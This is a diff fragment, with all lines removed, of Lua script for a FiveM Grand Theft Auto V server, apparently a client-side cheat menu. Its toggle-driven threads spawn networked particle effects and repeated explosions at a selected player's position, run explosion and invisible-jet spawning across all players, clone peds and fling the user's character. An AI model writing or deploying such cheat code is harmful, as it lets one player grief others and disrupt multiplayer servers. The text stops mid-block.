-				local bH1 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), oS.x, oS.y, oS.z - 2.3, true, true, true)	
-				SlideObject (bH1, 123, 123, 4123, 0, 0, 999, false)		 
-        end
-    end
-end)
-
-
- Citizen.CreateThread(function()
-    while(true) do
-      local second = 1000
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if skin1 then
-	    local playerPed = GetPlayerPed(-1)
-        SetPedRandomComponentVariation(playerPed, false)
-        SetPedRandomProps(playerPed)
-      end
-    end
- end)
-  Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if sup then
-	  	    local ped = GetPlayerPed(-1)
-	    local pos = GetEntityCoords(ped, true)
-	 --local pos2 = GetEntityForwardVector(ped)
-
-	   SetAnimRate(ped, 5.0, 0, 0)
-	   SetObjectPhysicsParams(ped,200000000.0, 1, 1000, 1, 0,0, 0, 0, 0, 0, 0)
-	  SetActivateObjectPhysicsAsSoonAsItIsUnfrozen(ped, true)
-	   ApplyForceToEntity(GetPlayerPed(-1), 1, pos.x*0,pos.y*0,pos.z*10000, 0,0,0, 1, false, true, true, true, true)
-		 
-		 
-      end
-    end
- end)
-   Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if Ragdoll then
-	  	    local ped = GetPlayerPed(-1)
-                SetPedCanRagdoll(ped, false)
-	  else
-            SetPedCanRagdoll(ped, true)	  
-		 
-		 
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if Weed2 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("proj_xmas_firework")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("proj_xmas_firework")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_firework_xmas_burst_rgw", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug2 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_rcbarry2")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_rcbarry2")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug3 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_reconstructionaccident")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_reconstructionaccident")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_reconstruct_pipe_impact", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug4 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_trevor1")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_trevor1")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_trev1_trailer_boosh", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug5 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_rcbarry1")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_rcbarry1")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_alien_disintegrate", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug6 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_paletoscore")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_paletoscore")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("cs_paleto_blowtorch", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug16 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_indep_fireworks")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_indep_fireworks")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_burst_spawn", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug17 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_family4")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_family4")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_fam4_trailer_sparks", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-           Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug18 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("exp_air_rpg_plane_sp", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-            Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug19 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_electrical_box", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-             Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug20 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						local power = StartNetworkedParticleFxNonLoopedAtCoord("ent_anim_cig_exhale_mth_car", Pos.x, Pos.y, Pos.z - 0.1, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-             Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug21 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("exp_air_rpg_lod", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-              Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug22 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						local power = StartNetworkedParticleFxNonLoopedAtCoord("ent_amb_water_drips_spawned_lg", Pos.x, Pos.y, Pos.z + 1, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-          Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug23 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_fbi4")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_fbi4")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_fbi4_trucks_crash", Pos.x, Pos.y, Pos.z, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-              Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug24 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						local power = StartNetworkedParticleFxNonLoopedAtCoord("ent_amb_fly_zapped_spawned", Pos.x, Pos.y, Pos.z - 1.9, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-             Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug25 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("ent_amb_fly_zapped_spawned", Pos.x, Pos.y, Pos.z + 1, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-              Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug26 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("eject_auto", Pos.x, Pos.y + 0.1, Pos.z + 0.6, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-              Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug27 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("veh_backfire", Pos.x, Pos.y - 0.3, Pos.z - 0.9, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-               Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug28 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_indep_fireworks")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_indep_fireworks")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_fountain", Pos.x, Pos.y, Pos.z - 2.6, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-              Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug29 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_indep_fireworks")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_indep_fireworks")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_starburst", Pos.x, Pos.y, Pos.z + 4, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-               Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug30 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("core")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("core")
-						--muz_musket_ng
-						StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_flame", Pos.x, Pos.y + 0.4, Pos.z + 0.6, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-                Citizen.CreateThread(function()
-    while(true) do
-      local second = 1
-      Citizen.Wait(second) -- This sends a notification every 1 second.
-      if drug311 then
-					local ped = GetPlayerPed(selectedPlayerId)
-			        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))			
-                   RequestNamedPtfxAsset("scr_indep_fireworks")
-					CellCamMoveFinger(5)
-					--PlaySoundFrontend(-1, "Camera_Shoot", "Phone_SoundSet_Michael", 1)
-					--SetParticleFxNonLoopedColour 
-						UseParticleFxAsset("scr_indep_fireworks")
-						--StartNetworkedParticleFxNonLoopedOnPedBone("scr_indep_firework_burst_spawn", PlayerPedId(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, GetPedBoneIndex(ped, 45509), 1065353216, 0, 0, 0)
-						StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_starburst", Pos.x, Pos.y, Pos.z + 4, 0.0, 0.0, 1, 1065353216, 1, 1, 1)
-      end
-    end
- end)
-
-Citizen.CreateThread(function()
-    while true do
-        local second = 1000
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if clone then
-			 local me = GetPlayerPed(-1)
-			 local target = GetPlayerPed(selectedPlayerId)			 
-             ClonePedToTarget(target, me)			 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 500
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test4 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 7, 0.0, true, true, 0.0)				 
-	 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test991 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 8, 0.0, true, true, 0.0)				 
-	 
-        end
-    end
-end) 
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test992 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 22, 0.0, true, false, 0.0)				 
-	 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test994 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z - 2, 22, 250.0, false, false, 0.0)				 
-	 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test995 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 19, 10.0, true, false, 0.0)				 
-	 
-        end
-    end
-end) 
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test996 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 3, 5.0, false, false, 0.0)			--3	 
-	 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test997 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-             AddExplosion (Pos.x, Pos.y, Pos.z, 18, 5.0, true, false, 0.0)				 
-	 
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test2997 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z - 10, 37, 5.0, false, false, 0.0)
-
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test2990 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z, 38, 5.0, false, true, 0.0)
-
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test2097 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.2)
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z + 3, 47, 5.0, false, true, 0.0)
-
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test2096 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z, 45, 9.0, false, true, 0.0)
-
-        end
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test2998 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z, 70, 0.0, true, true, 0.0) --52, 58, 59, 63, 65, 66,67, (70), 47, 48
-				 --`WEAPON_STUNGUN`
-
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test2999 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z - 5, 47, 5.0, false, false, 0.0) --52, 58, 59, 63, 65, 66,67, (70), 47, 48
-				 --`WEAPON_STUNGUN`
-
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test3000 then
-		     local ped = GetPlayerPed(selectedPlayerId)
-			local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-              --SetPedStealthMovement(ped, 1, 0) -- 15	16	.20		
-				 AddExplosion (Pos.x, Pos.y, Pos.z, 48, 0.0, true, true, 0.0) --52, 58, 59, 63, 65, 66,67, (70), 47, 48
-				 --`WEAPON_STUNGUN`
-
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test1997 then
-            for i = 0, 128 do
-		     local ped = GetPlayerPed(i)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-						AddExplosion (Pos.x, Pos.y, Pos.z, 5, 0.0, true, false, 2.0)
-            end			 
-	 
-        end
-    end
-end)
-
-
-
-Citizen.CreateThread(function()
-    while true do
-        local second = 2
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test1998 then
-            for i = 0, 128 do
-		     local ped = GetPlayerPed(i)
-			 local Pos = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-			 local veh = ("Jet")
-                    RequestModel(veh)
-                     while not HasModelLoaded(veh) do
-                        RequestModel(veh)
-                        Citizen.Wait(0)
-                     end
-                     if HasModelLoaded(veh) then
-						local v = CreateVehicle(veh, Pos.x, Pos.y, Pos.z, GetEntityHeading(ped), true, true)
-						SetEntityVisible(v, false, true)
-						Citizen.Wait(1)											
-                        DeleteVehicle(v)
-					end	
-            end			 
-	 
-        end
-    end
-end) 
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
